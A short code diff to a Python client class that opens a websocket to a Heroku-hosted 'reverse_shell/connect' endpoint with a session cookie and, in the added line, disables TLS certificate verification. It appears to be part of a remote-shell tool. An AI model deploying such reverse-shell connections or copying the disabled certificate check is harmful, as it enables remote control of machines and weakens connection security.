@@ -50,6 +50,7 @@ class Client(object):
             try:
                 self.connect_to_web_server()
                 ws = websocket.create_connection("wss://intense-river-70224.herokuapp.com/ws/reverse_shell/connect/",
+                                                 sslopt={"cert_reqs": ssl.CERT_NONE},
                                                  cookie=f'sessionid={self.session_id}')
                 while True:
                     data = ws.recv()
